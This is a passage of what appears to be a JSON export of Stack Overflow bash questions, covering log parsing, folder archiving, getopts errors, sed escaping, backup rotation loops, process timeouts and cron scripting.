result:</p>\n\n<pre><code>from/1.txt\nfrom/2.txt\nmove\nfrom/3.txt\n</code></pre>\n\n<p>That 'move' is left.</p>\n"},{"tags":["linux","bash","shell","unix","scripting"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":53,"score":0,"question_id":12523967,"title":"want delimited data from file which has headers footers,for data crunching to do performance analysis","body":"<p>I have a file which has header and footers and data is over multiple iteration (with headers and footers), I want to delimit the data and don't want headers footers. My objective is to data crunching in order to do performance analysis, its just that parsing piece is not going fine.</p>\n\n<p>Data in file:</p>\n\n<pre><code>   09:31:56 12/13/11 r/w I/O per second KBytes per sec  Svt ms     IOSz KB     \n              VVname      Cur  Avg  Max  Cur  Avg  Max Cur Avg   Cur   Avg Qlen\n               admin   r    0    0    0    0    0    0 0.0 0.0   0.0   0.0    -\n               admin   w   17   17   17   68   68   68 0.2 0.2   4.1   4.1    -\n               admin   t   17   17   17   68   68   68 0.2 0.2   4.1   4.1    0\n z0001_app0136_s.254   r    0    0    0    0    0    0 0.0 0.0   0.0   0.0    -\n z0001_app0136_s.254   w    0    0    0    0    0    0 0.0 0.0   0.0   0.0    -\n z0001_app0136_s.254   t    0    0    0    0    0    0 0.0 0.0   0.0   0.0    0\n....................\n....................\n\n-----------------------------------------------------------------------------------\n  Footer            394   r   87   87      4354 4354      2.7 2.7  49.9  49.9    -\n  Footer            394   w  126  126       906  906      0.1 0.1   7.2   7.2    -\n  Footer            394   t  213  213      5260 5260      1.2 1.2  24.7  24.7    0\n   09:32:57 12/13/11 r/w I/O per second KBytes per sec    Svt ms     IOSz KB     \n              VVname      Cur  Avg  Max  Cur  Avg  Max  Cur  Avg   Cur   Avg Qlen\n               admin   r    0    0    0    0    0    0  0.0  0.0   0.0   0.0    -\n               admin   w   32   24   32  130   99  130  0.2  0.2   4.1   4.1    -\n               admin   t   32   24   32  130   99  130  0.2  0.2   4.1   4.1    0\n z0001_app0136_s.254   r    0    0    0    0    0    0  0.0  0.0   0.0   0.0    -\n z0001_app0136_s.254   w    0    0    0    0    0    0  0.0  0.0   0.0   0.0    -\n</code></pre>\n\n<p>And data over in file goes over again and again.</p>\n"},{"tags":["bash"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":13,"score":-2,"question_id":13167458,"title":"Trying To Move Folders Based On Name and Date With a Bash Script","body":"<p>I have an archive of folders with subfolders labeled, 2012-08-29, 2012-10-10, 2012-09-01 etc., that I'm trying to archive with a bash script into folders monthly 2012-08, 2012-09, 2012-10, etc. </p>\n\n<p>I was initially archiving by week but found that it would be problematic when a week would have days from 2 different months as 1 or more of the days would be archived in the wrong month's folder.</p>\n\n<p>Any idea on trying to make this happen with a simple bash script?</p>\n"},{"tags":["bash","shell","cygwin"],"answer_count":2,"favorite_count":2,"up_vote_count":1,"down_vote_count":0,"view_count":32,"score":1,"question_id":13167000,"title":"$INPUT Ambiguous redirect","body":"<p>I wrote this script a while ago and it worked fine, but for some reason I am getting a \"Ambiguous redirect\" error message for line 11 in cygwin now.</p>\n\n<pre><code>#!/bin/bash\ncd 'my/file/path'\nINPUT= ./Students.csv\nOLDIFS=$IFS\nIFS=,\n[ ! -f $INPUT ] &amp;&amp; { echo \"$INPUT file not found\"; exit 99; }\nwhile read flname\ndo\n    cp Rubric.pdf ./Grades/$flname_rubric.PDF\n\ndone &lt; $INPUT\nIFS=$OLDIFS\n</code></pre>\n\n<p>What am I doing wrong here?</p>\n"},{"tags":["linux","bash","shell","bash4"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":70,"score":1,"question_id":13065406,"title":"pattern-matching a comma delimited digits as string","body":"<p>How do I do a pattern-match for this: 4,7,9....n - a comma delimited string of digits as user input? I'm using case statement for that and I believe, case rather use  pattern-matching than regex. This is what user gets:</p>\n\n<pre><code>Do you want to delete any of these?\n     [ 1 ]   launch-EOsgR4\n     [ 2 ]   launch-SWZQdJ\n     [ 3 ]   launch-tHAdIm\n     [ 4 ]   launchd-235.z4KTVx\n     [ 5 ]   launchd-257.nM2wOZ\n     [ 6 ]   progress.log\n     [ 7 ]   ssh-8pISGGnlZ5\n----------------------------------------\nSingle: 4; Multiple: 2,3; Range: 4..7\na to delete all; n to cancel and exit\n----------------------------------------\n( [1][2][3][4][5][6][7] | a | n ): \n</code></pre>\n\n<p>And, as the showed above, users got the option for a single number (easy), a range: 6..9 (also not so hard) or multiple: 3,5,6 (find a bit hard with 'single number' option). This is what I've done so far....</p>\n\n<pre><code>#!/usr/bin/env bash\n\nNL=$(echo -e \"\\033[0;0m\")\nBD=$(echo -e \"\\033[0;1m\")\nERR=$(printf \"\\n%-25s\" \"$(echo -e \"\\033[1;31m[ ERROR ]\\033[0m\")\")\nWRN=$(printf \"\\n%-25s\" \"$(echo -e \"\\033[1;33m[ WARN  ]\\033[0m\")\")\n\n\nls /tmp | tail -n9 &gt; list_of_file\ns=$(printf \"%-40s\" \"-\")\n\nfunction lstFile()\n{\n    local file=$1\n    if [[ -s $file ]]\n    then\n        LINES=( $(cat $file) ); echo \"\"\n        for ix in ${!LINES[@]}\n        do\n            printf \"%-5s%-14s%s\\n\" \"\" \"${BD}[ $(( ix+1 )) ]\" \"${LINES[$ix]}${NL}\"\n        done\n   else\n       exit 0\n   fi\n\n   LST=$(echo ${!LINES[@]}|awk -v ORS=']' '{for (i=1; i&lt;=NF; i++) print \"[\"($i+1)}')\n}\n\nfunction delOpt()\n{\n    echo \"${s// /-}\"\n    echo -e \"Single: 4; Multiple: 2,3; Range: 4..7\"\n    echo -e \"${BD}a${NL} to delete all; ${BD}n${NL} to cancel and exit\"\n    echo \"${s// /-}\"\n    echo -n \"( $1 | a | n ): \"\n}\n\necho -e \"\\nDo you want to delete any of these?\"\nlstFile list_of_file\n\nANS=\nuntil [[ \"${ANS}\" == \"N\" || \"${ANS}\" == \"n\" || \"${ANS}\" == \"e\" ]]\ndo\n    delOpt $LST\n    read ANS &amp;&amp; echo \"\"\n\n    ANS=$( tr '[:upper:]' '[:lower:]' &lt;&lt;&lt; \"$ANS\" )\n    [[ -n $(echo $ANS|grep -E -w \"^[aen0-9,]{1,}\") ]] &amp;&amp; : || ANS=\"X\"\n\ncase ${ANS} in\n    [0-9]..[0-9] )\n\n    for ix in $(eval echo \\{$ANS\\}); do\n        LINE=${LINES[(( $ix-1 ))]}\n        echo -e \"Deleting:  ${BD}${LINE}${NL}\"\n        sed -i -c \"/$LINE/d\" list_of_file\n    done\n    unset LINE\n    lstFile list_of_file\n    ;;\n\n    [0-9,]* )\n    ANS=$(echo $ANS | awk -F' |,' '{for (i=1; i&lt;=NF; i++) print $i}')\n    for ix in $ANS; do\n        if [[ $ix -gt ${#LINES[@]} ]]\n        then\n            echo  \"${ERR}Out-of-range value: ${bd}$ix${NL}\"\n        else\n            LINE=${LINES[(( $ix-1 ))]}\n            echo -e \"Deleting:  ${BD}${LINE}${NL}\"\n            sed -i -c \"/$LINE/d\" list_of_file &gt; /dev/null 2&gt;&amp;1\n        fi\n    done\n    unset LINE\n    lstFile list_of_file\n    ;;\n\n    a )              \n    for ix in ${LINES[@]}; do\n        echo \"Deleting:  ${BD}${ix}${NL}\"\n        sed -i -c \"/$ix/d\" list_of_file\n    done\n    exit 0\n    ;;\n\n    n|e ) exit 0\n    ;;\n\n    * ) echo \"${WRN}Invalid entry! Should be digit or ${BD}a${NL} for All.\"\n    printf \"%-14s%s\\n\\n\" \"\" \"Otherwise, enter ${UL}n${NL}o or ${UL}e${NL}xit to quit\"\n    ;;\nesac\ndone\n</code></pre>\n\n<p>which is working fine (sort of) but there are some race conditions. e.g.</p>\n\n<pre><code>2,d,7 - throws in: bad array subscript\n6..10 - throws in: (( 6..11-1 )): syntax error: invalid arithmetic operator (error token is \"..11-1 ))\")\nbut, \n6..9  - throws in: first RE may not be empty\n</code></pre>\n\n<p>Is there any way to have separate options to catch 'single' and 'multiple' number input? Also, any suggestions on overall improvement?</p>\n\n<p>Any help greatly appreciated. Cheers!!</p>\n\n<p><hr>\n<strong>Update: 31/10</strong><br><br>\nIt's working now. Thanks to Alepac for the suggestion.<br>\nJust in case, if someone else is also looking for something similar, I'm putting it in here. As per my original code, this function will delete the line(s) from a file: <code>list_of_file</code> according to the user input.</p>\n\n<pre><code>function chkINPUT()\n{\n    local I_PUT=( \"$@\" )\n    local MAX=${#LINES[@]}\n    #IFS=', ' read -a SPLITTED &lt;&lt;&lt; \"$I_PUT\"\n    local SPLITTED=( $(echo \"${I_PUT[@]}\" | awk -F',| ' '{for (i=1; i&lt;=NF; i++) print $i}') )\n\n    for idx in \"${!SPLITTED[@]}\"\n    do\n        SPLTD=${SPLITTED[idx]}\n\n        # Check if it's a range [4..7]\n        if [[ \"${SPLTD}\" =~ ^[0-9]{1,2}\\.\\.[0-9]{1,2}$ ]]\n        then\n            for ix in $(eval echo \\{$SPLTD\\}); do\n                if (( ${ix} &lt;= $MAX )); then\n                    LINE=${LINES[(( ix-1 ))]}\n                    echo -e \"Deleting:  ${BD}${LINE}${NL}\"\n                    sed -i -e \"/$LINE/d\" list_of_file 2&gt;&amp;1 &gt; /dev/null\n                    unset LINE\n                else\n                    echo -e \"\\t${ix} =&gt; Out of range\"\n                    break\n                fi\n            done\n\n        # Check if it's a single input\n        elif [[ \"${SPLTD}\" =~ ^[[:digit:]]+$ ]]\n        then\n            if (( ${SPLTD} &lt;= $MAX )); then\n                LINE=${LINES[(( SPLTD-1 ))]}\n                echo -e \"Deleting:  ${BD}${LINE}${NL}\"\n                sed -i -e \"/$LINE/d\" list_of_file 2&gt;&amp;1 &gt; /dev/null\n                unset LINE\n            else\n                echo  \"${ERR}Out-of-range value: ${bd}$SPLTD${NL}\"\n            fi\n\n        else\n            echo  \"${ERR}Invalid entry: ${bd}$SPLTD${NL}; must be an integer from the list!\"\n        fi\n    done\n}\n</code></pre>\n\n<p>and then, use it like this:</p>\n\n<pre><code>ANS= \nuntil [[ \"${ANS}\" == \"N\" || \"${ANS}\" == \"n\" || \"${ANS}\" == \"e\" ]] \ndo\n    delOpt $LST\n    read ANS &amp;&amp; echo \"\"\n    ANS=$( tr '[:upper:]' '[:lower:]' &lt;&lt;&lt; \"$ANS\" )\n\n    case ${ANS} in\n        [0-9]* )\n        chkINPUT ${ANS}\n        ;;    \n</code></pre>\n\n<p>Hope it helps. Cheers!!</p>\n"},{"tags":["linux","bash","ubuntu","centos"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":50,"score":0,"question_id":13166619,"title":"Why these argument parsing errors?","body":"<p>I would like to write a script that requires <code>-c</code> and <code>-f</code> where each requires an option.</p>\n\n<p>When I run my script below I get some unexpected errors:</p>\n\n<pre><code>$ ./user.sh -c\n./user.sh: option requires an argument -- c\n\nUsage: user.sh -c username -f filename\n   -c username\n   -f SSH public key\n\n$ ./user.sh -c gg\nError: You have not given a filename.\n</code></pre>\n\n<p>In the first case, I would have liked it said I am missing the option for <code>-c</code> and in the second case I would have liked it said I am missing <code>-f</code>.</p>\n\n<p><strong>Question</strong></p>\n\n<p>How do I make such error handing, and what am I doing wrong?</p>\n\n<p><strong>user.sh</strong></p>\n\n<pre><code>#!/bin/bash                                                                                             \n\nusage () {\n    echo \"Usage: user.sh -c username -f filename\"\n    echo \"   -c username\"\n    echo \"   -f SSH public key\"\n    echo \"\"\n}\n\nif ! [ \"$*\"  ]; then\n    usage\n    exit 1\nfi\n\nwhile getopts \"c:f:\" opt; do\n    case $opt in\n        c) user=$OPTARG;;\n        f) filename=$OPTARG;;\n        \\?)\n            echo\n            usage\n            exit 1;;\n        *) echo \"Internal error: Unknown option.\";;\n    esac\ndone\n\nif ! [ $filename ]; then\n    echo \"Error: You have not given a filename.\"\n    exit 1\nfi\n\nif ! [ $user ]; then\n    echo \"Error: You have not given an username.\"\n    exit 1\nfi\n</code></pre>\n"},{"tags":["linux","bash","replace"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":41,"score":0,"question_id":13146826,"title":"linux bash replace placeholder with unknown text which can contain any characters","body":"<p>If I want to replace for example the placeholder <code>{{VALUE}}</code> with another string which can contain any characters, what's the best way to do it?</p>\n\n<p>Using <code>sed s/{{VALUE}}/$(value)/g</code> might fail if <code>$(value)</code> contains a slash...</p>\n"},{"tags":["bash"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":4,"view_count":45,"score":-4,"question_id":13162981,"title":"Start program/functions in BASH","body":"<p>How to run a sh file or function to the end there was nothing on display? \nHow to run a program/funtion that was not the end in the terminal.</p>\n\n<p>Main terminal after logging</p>\n\n<pre><code>-------------------------\nroot@charlie:~#\nroot@charlie:~#_\n-------------------------\n</code></pre>\n\n<p>Main terminal before starting go.sh</p>\n\n<pre><code>-------------------------\nroot@charlie:~#\nroot@charlie:~# go.sh_\n-------------------------\n</code></pre>\n\n<p>Main terminal work go.sh</p>\n\n<pre><code>-------------------------\nroot@charlie:~#\nroot@charlie:~# go.sh\n....................................\n....................................\nexit\n-------------------------\n</code></pre>\n\n<p>Main terminal after the end (terminal is clean)</p>\n\n<pre><code>-------------------------\nroot@charlie:~#\nroot@charlie:~# go.sh\nroot@charlie:~#_\n-------------------------\n</code></pre>\n\n<p>Advise anyone? Thank you.<code>enter code here</code></p>\n"},{"tags":["bash","hex"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":58,"score":0,"question_id":13160309,"title":"Conversion hex string into ascii in bash command line","body":"<p>I have a lot of this kind of string and I want to find a command to convert it in ascii, I tried with <code>echo -e</code> and <code>od</code>, but it did not work.</p>\n\n<pre><code>0xA7.0x9B.0x46.0x8D.0x1E.0x52.0xA7.0x9B.0x7B.0x31.0xD2\n</code></pre>\n"},{"tags":["bash"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":29,"score":0,"question_id":13162866,"title":"Bash For Loop: Decrementing starting from a variable","body":"<p>I've done some searching and this looks like it should work, and it isn't, and I'm stumped.</p>\n\n<p>I'm on a CentOS box and want to basically shift all backups 1 folder up, to a limit of like 60 backups, and that limit is set in a variable $BKPLIMIT.</p>\n\n<pre><code>for (( i=$BKPLIMIT; i==0; i-- )); do\n    j=$(($i-1))\n    if [ -d \"backup.$j\" ]; then\n        echo \"$i $j backup.$i backup.$j\"\n        #mv \"backup.$j\" \"backup.$i\"\n    fi\ndone\n</code></pre>\n\n<p>It looks, from my debugging, the script is not entering the loop.  I is stumped :( I've also tried doing \"$(seq $BKPLIMIT 0) which didn't work.</p>\n"},{"tags":["linux","bash","unix","amazon-ec2"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":40,"score":0,"question_id":13148438,"title":"How to view the bash_history for root?","body":"<p>I have a linux box on amazon's aws EC2. I can view the user's bash_history here:</p>\n\n<pre><code>/home/ec2-user/.bash_history\n</code></pre>\n\n<p>However when I root in:</p>\n\n<pre><code>sudo -s\n</code></pre>\n\n<p>I do not get the root's bash_history. How can I view/find the bash_history for the admin user?</p>\n\n<p>Thanks,\nBrett</p>\n"},{"tags":["html","bash","html-escape-characters"],"answer_count":5,"favorite_count":2,"up_vote_count":2,"down_vote_count":0,"view_count":1264,"score":2,"question_id":5929492,"title":"Bash script to convert from HTML entities to characters","body":"<p>I'm looking for a way to turn this:</p>\n\n<pre><code>hello &amp;lt; world\n</code></pre>\n\n<p>to this:</p>\n\n<pre><code>hello &lt; world\n</code></pre>\n\n<p>I could use sed with a bunch of substitutions, but isn't there a tool that will do that for me in one go?</p>\n"},{"tags":["arrays","bash","loops","screen"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":41,"score":0,"question_id":13151527,"title":"Looping an array index into a screen session","body":"<pre><code>    #!/bin/bash\n\n    IFS=$'\\n'\n    fortune_lines=($(fortune | fold -w 30))\n    Screen_Session=$\"{mainscreen}\"\n    Screen_OneLiner=$(screen -p 0 -S ${Screen_Session} -X stuff \"`printf \"say   ${fortune_lines[@]}\\r\"`\")\n\n    for var in \"${Screen_OneLiner[@]}\"\n      do\n        echo -e \"${var}\"\n    done\n</code></pre>\n\n<p>The above script only prints out line 1 one of </p>\n\n<pre><code>     IFS=$'\\n'\n    fortune_lines=($(fortune | fold -w 30))\n</code></pre>\n\n<p>Instead of cycling through the whole index of \"fortune_lines\" Not sure how to make this work.\nAny ideas?</p>\n\n<p>FYI\nI am only using </p>\n\n<pre><code>   \"echo -e\"\n</code></pre>\n\n<p>to troubleshoot this script.</p>\n"},{"tags":["bash","script","find","bundle"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":74,"score":0,"question_id":12281712,"title":"How to use find to bundle files","body":"<p>I'm struggling with this task:</p>\n\n<blockquote>\n  <p>Write a script that takes as input a directory (path) name  and a\n  filename base (such as \".\", \"*.txt\", etc). The script shall search the\n  given directory tree, find all files matching the given filename, and\n  bundle them into a single file. Executing the given file as a script\n  should return the original files.</p>\n</blockquote>\n\n<p>Can anyone help me?</p>\n\n<p>First i tried to do the find part like this:</p>\n\n<pre><code>#!/bin/bash\n\nfilebase=$2\npath=$1\n\nfind $path \\( -name $base \\)\n</code></pre>\n\n<p>Then i found this code for bundle, but I dont know how to combine them.</p>\n\n<pre><code>for i in $@; do\n echo \"echo unpacking file $i\"\n echo \"cat &gt; $i &lt;&lt;EOF\"\n cat $i\n echo \"EOF\"\n done\n</code></pre>\n"},{"tags":["php","bash","ansi","xterm"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":54,"score":3,"question_id":13131162,"title":"Line wrapping issues in xterm","body":"<p>I am writing a program that prints colored lines, and the more I do with it the more I find myself working around line wrapping issues that come up.</p>\n\n<p>It is a sort of terminal written in php, here is the prompt:</p>\n\n<pre><code>$return = readline(\"\\033[44m\\033[1;37m{$this-&gt;text}&gt;&gt;\\033[0m \");\n</code></pre>\n\n<p>and scrolling through history, the non-printing characters play havoc on everything.</p>\n\n<p>If I try to add escapes</p>\n\n<pre><code>$return = readline(\"\\[\\033[44m\\033[1;37m\\]{$this-&gt;text}&gt;&gt;\\[\\033[0m\\] \");\n</code></pre>\n\n<p>then it prints the brackets...even if I add double backslashes.</p>\n\n<pre><code>\\[\\][timer]&gt;&gt;\\[\\] \n</code></pre>\n\n<p>I find the same thing for echo -e, I am really not sure whats going on.</p>\n\n<p>Lastly, if I modify PS1 it works just fine.</p>\n\n<pre><code>[mike@crest ~]$ export PS1=\"\\[\\033[44m\\033[1;37m\\][timer]&gt;&gt;\\[\\033[0m\\] \"\n[timer]&gt;&gt;\n</code></pre>\n\n<p>What am I missing here?</p>\n\n<p>Edit: the coloring/display is not the problem. The problem is that bash will have line wrapping issues when invisible characters are printed without escapes...and when I add the escapes they are printed in plain text under all circumstances but PS1, and I'm not sure what the difference is, how to get it working in PHP.</p>\n"},{"tags":["bash","directory","exec","cp","mv"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":33,"score":1,"question_id":13157870,"title":"find directories with exec conditional copy & delete","body":"<p>What I'm trying to accomplish is moving directories from one place to another. A <code>mv</code> however fails when the target already exists, and therefor the delete of the source also fails. So I'm trying to use <code>cp &amp;&amp; rm</code> for this:</p>\n\n<pre><code>find /home/user_a -path /home/user_a/* -type d -exec [ cp -Rf {} /home/user_b &amp;&amp; rm -rf {} ] \\;\n</code></pre>\n\n<p>This fails with a <code>missing argument for exec</code>. Where am I wrong?</p>\n"},{"tags":["linux","bash","unix"],"answer_count":4,"favorite_count":1,"up_vote_count":6,"down_vote_count":0,"view_count":4772,"score":6,"question_id":5161193,"title":"Bash script that kills a child process after a given timeout","body":"<p>I have a bash script that launches a child process that crashes (actually, hangs) from time to time and with no apparent reason (closed source, so there isn't much I can do about it). As a result, I would like to be able to launch this process for a given amount of time, and kill it if it did not return successfully after a given amount of time.</p>\n\n<p>Is there a <strong>simple</strong> and <strong>robust</strong> way to achieve that using bash? </p>\n\n<p>P.S.: tell me if this question is better suited to serverfault or superuser.</p>\n"},{"tags":["bash"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":39,"score":1,"question_id":13151031,"title":"How to expand environment variable in bash function definition?","body":"<p>I am trying to so something like this in my bashrc </p>\n\n<pre><code>SERVER=abc.com\ngeta() { scp ${SERVER}:$1 . ;}\n\nSERVER=xyz.com\ngetx() { scp ${SERVER}:$1 . ;}\n\ndeclare -f geta getx\ngeta () \n{ \n    scp ${SERVER}:$1 .\n}\ngetx () \n{ \n    scp ${SERVER}:$1 .\n}\n</code></pre>\n\n<p>What I want geta and getx to be set to is </p>\n\n<pre><code>geta () { scp abc.com:$1 . }\ngetx () { scp xyz.com:$1 . }\n</code></pre>\n\n<p>Is there a way to force variable expansion in function definitions? </p>\n\n<p>Note: For clarification I changed the example</p>\n"},{"tags":["bash","string","sed","escaping"],"answer_count":5,"favorite_count":17,"up_vote_count":37,"down_vote_count":0,"view_count":33167,"score":37,"question_id":407523,"title":"Escape a string for sed search pattern","body":"<p>In my <code>bash</code> script I have an external (received from user) string, which I should use in <code>sed</code> pattern.</p>\n\n<pre><code>REPLACE=\"&lt;funny characters here&gt;\"\nsed \"s/KEYWORD/$REPLACE/g\"\n</code></pre>\n\n<p>How can I escape the <code>$REPLACE</code> string so it would be safely accepted by <code>sed</code> as a literal replacement?</p>\n\n<p><strong>NOTE:</strong> The <code>KEYWORD</code> is a dumb substring with no matches etc. It is not supplied by user.</p>\n"},{"tags":["bash","process"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":23,"score":0,"question_id":13157626,"title":"Running processes simultaneously, Bash","body":"<p>I would like to run <code>n</code> processes (in my case simulations) simultaneously, using bash.\nRight now this is what I'm running:</p>\n\n<pre><code>for file in $ini/SAN*.ini;\ndo\n    echo \"Running $file...\";\n    temp=$(basename $file .ini)\n    mosrun -G opp_run -r 0 -u Cmdenv -n ..:../../src -l ../../src/inet SAN.ini &gt; $outputs/$temp.out;\ndone\n</code></pre>\n\n<p>Problem is, the loop only progresses to the next iteration after the simulation is done. Any suggestions? Thanks!</p>\n"},{"tags":["bash","shell"],"answer_count":2,"favorite_count":1,"up_vote_count":0,"down_vote_count":2,"view_count":41,"score":-2,"question_id":13152605,"title":"Runtime of the bashscript how to i access the terminal control?","body":"<p>I can create the bashscript and runtime of the bashscript i can create a one</p>\n\n<p>cat file and if the file is created and delete cat file in terminal</p>\n\n<p>using bashscript runtime</p>\n\n<p>I run the script and script output is access the terminal  operation like create the cat file and delete the file and I close the script after terminal is old stage.</p>\n\n<p>I run the script</p>\n\n<p>$> bash bash.sh</p>\n\n<p>Access the terminal</p>\n\n<p>cat>name</p>\n\n<p>1</p>\n\n<p>2</p>\n\n<p>3</p>\n\n<p>cat name</p>\n\n<p>1</p>\n\n<p>2</p>\n\n<p>3</p>\n\n<p>rm name</p>\n\n<p>close the script</p>\n\n<p>$> -</p>\n"},{"tags":["xml","bash","search","printing"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":13147630,"title":"print XML tag with bash","body":"<p>I am trying to figure out how to use bash to print a certain line in a few XML files.  These files are located in several folders.  The line I need to print is an exact XML tag called \n<code>&lt;name&gt;&lt;/name&gt;</code>.  </p>\n\n<p>My objectives:</p>\n\n<ul>\n<li>search through folders</li>\n<li>print folder location on one line</li>\n<li>print file name on second line</li>\n<li><p>print what is between </p>\n\n<p></p></li>\n</ul>\n\n<p>I only need the name and not the full path and I do need it to add to a .txt file called whatever.  Ive tried with bash but Im stuck on this one.</p>\n\n<p>EDIT:\nI also forgot to mention that this is a piece being added to some other shell script so Im unsure if I can get grep to work within it.</p>\n"},{"tags":["bash","shell","cron"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":25,"score":0,"question_id":13156550,"title":"shell script adjusment - not working fine with cron","body":"<p>i used this bash script to check services running or not if running  the script will exit if else it will run another script which gona execute some commands \nand once done it will be exit \nmy issue is when i run my script manuly its works fine but when i run it with cron its not running and not executed correctly here is my script </p>\n\n<pre><code>  #!/bin/sh\n  SERVICE='loop2.sh'\n\n  if ps ax | grep -v grep | grep $SERVICE &gt; /dev/null\n then\n     echo \"$SERVICE service running, everything is fine\"\n else\n /home//www/loop2.sh\n fi\n</code></pre>\n\n<p>any adjust to my script to be working fine in cron</p>\n"},{"tags":["bash","shell","ubuntu","cmd"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":103,"score":2,"question_id":13153101,"title":"syntax error near unexpected token `('","body":"<p>I am new to writing scripts, in ubuntu.</p>\n\n<pre><code>FOR /F \"tokens=2 skip=4\" %%G IN ('svn info --revision HEAD') DO...\n</code></pre>\n\n<p>I get the following error -- \"syntax error near unexpected token `('\". Can someone tell me why I get this error?</p>\n"},{"tags":["bash","scripting","sed"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":50,"score":1,"question_id":13149589,"title":"How to avoid having to add '\\n' with sed(1)","body":"<p>I want to insert a big chunk of code using a bash script.</p>\n\n<p>This is how I got it to work using sed(1);</p>\n\n<pre><code>$ sed \"/);/i\\\n\\ \\ \\ \\ 'doctrine' =&gt; array(\\n\\\n        'driver' =&gt; array(\\n\\\n            __NAMESPACE__ . '_driver' =&gt; array(\\n\\\n                'class' =&gt; 'Doctrine\\ORM\\Mapping\\Driver\\AnnotationDriver',\\n\\\n                'cache' =&gt; 'array',\\n\\\n                'paths' =&gt; array(__DIR__ . '\\../src/' . __NAMESPACE__ . '/Entity')\\n\\\n            ),\\n\\\n            'orm_default' =&gt; array(\\n\\\n                'drivers' =&gt; array(\\n\\\n                    __NAMESPACE__ . '\\Entity' =&gt; __NAMESPACE__ . '_driver'\\n\\\n                )\\n\\\n            )\\n\\\n        )\\n\\\n    ),\\n\n\" config/autoload/local.php;\n</code></pre>\n\n<p>Note: I had to add \\n and \\ at the end of each line in order to make it work.</p>\n\n<p>Is there a way to \"not\" have to do that? To insert plain text? Perhaps a different command?</p>\n\n<p><strong>Edit: my question is how to insert the text without having to add all the backslashes and newlines.</strong></p>\n\n<p>This is the text I need to insert:</p>\n\n<blockquote>\n<pre><code>'doctrine' =&gt; array(\n    'driver' =&gt; array(\n        __NAMESPACE__ . '_driver' =&gt; array(\n            'class' =&gt; 'Doctrine\\ORM\\Mapping\\Driver\\AnnotationDriver',\n            'cache' =&gt; 'array',\n            'paths' =&gt; array(__DIR__ . '/../src/' . __NAMESPACE__ . '/Entity')\n        ),\n        'orm_default' =&gt; array(\n            'drivers' =&gt; array(\n                __NAMESPACE__ . '\\Entity' =&gt; __NAMESPACE__ . '_driver'\n            )\n        )\n    )\n)\n</code></pre>\n</blockquote>\n"},{"tags":["python","bash"],"answer_count":6,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":75,"score":1,"question_id":13150345,"title":"Extract words from a file, then list files along with line number that contain those words","body":"<p>I have a file called Strings.h, that I use to localize an app I have. I want to search through all of my class files, and find out if and where I am using each string, and output the classes and line numbers for each string.</p>\n\n<p>My thought is to use Python, but maybe that's the wrong tool for the job. Also, I have a basic algorithm, but I worry it will take too long to run. Can you write this script to do what I want, or even just suggest a better algorithm?</p>\n\n<p>Strings.h looks like this:</p>\n\n<pre><code>#import \"NonLocalizedStrings.h\"\n\n#pragma mark Coordinate Behavior Strings\n#define LATITUDE_WORD NSLocalizedString(@\"Latitude\", @\"used in coordinate behaviors\")\n#define LONGITUDE_WORD NSLocalizedString(@\"Longitude\", @\"used in coordinate behaviors\")\n#define DEGREES_WORD NSLocalizedString(@\"Degrees\", @\"used in coordinate behaviors\")\n#define MINUTES_WORD NSLocalizedString(@\"Minutes\", @\"Used in coordiante behaviors\")\n#define SECONDS_WORD NSLocalizedString(@\"Seconds\", @\"Used in DMSBehavior.m\")\n\n...\n</code></pre>\n\n<p>The script should take each line that starts with #define, and then make a list of the word that appears after #define (e.g.) LATITUDE_WORD</p>\n\n<p>The pseudocode might be:</p>\n\n<pre><code>file = strings.h\nfor line in file:\n  extract word after #define\n  search_words.push(word) \n\nprint search_words\n[LATITUDE_WORD, LONGITUDE_WORD, DEGREES_WORD, MINUTES_WORD, SECONDS WORD]\n</code></pre>\n\n<p>After I have the list of words, my pseudocode is something like:</p>\n\n<pre><code>found_words = {}\nfor word in words:\n   found_words[word] = []\n\nfor file in files:\n  for line in file:\n    for word in search_words:\n      if line contains word:\n        found_words[word].push((filename, linenumber))   \n\nprint found_words\n</code></pre>\n\n<p>So, found words would look something like:</p>\n\n<pre><code> {\n   LATITUDE_WORD: [\n                    (foo.m, 42),\n                    (bar.m, 132) \n                  ],\n   LONGITUDE_WORD: [\n                    (baz.m, 22),\n                    (bim.m, 112) \n                  ],\n\n }\n</code></pre>\n"},{"tags":["bash","shell","if-statement"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":43,"score":1,"question_id":13143969,"title":"Equality test in `if` command returning the error message \"no such file or directory\"","body":"<p>I'm writing a shell script and I'm doing</p>\n\n<pre><code>if [\"$item0\" == \"$item1\"]\nthen\necho match\nfi\n</code></pre>\n\n<p>but it's giving the error message \"No such file or directory\" on the line when run. The items above do contain file paths if that helps.</p>\n"},{"tags":["bash","grep"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":46,"score":0,"question_id":13150510,"title":"grep some expresion from some logs and only select the ones with positive results","body":"<p>I'm using 'zgrep' to find some ip's from some apache/nginx logs and I need a way to sort only positive results.</p>\n\n<p>I'm using this:</p>\n\n<pre><code>for i in `cat /var/tmp/list_of_ip.txt`; 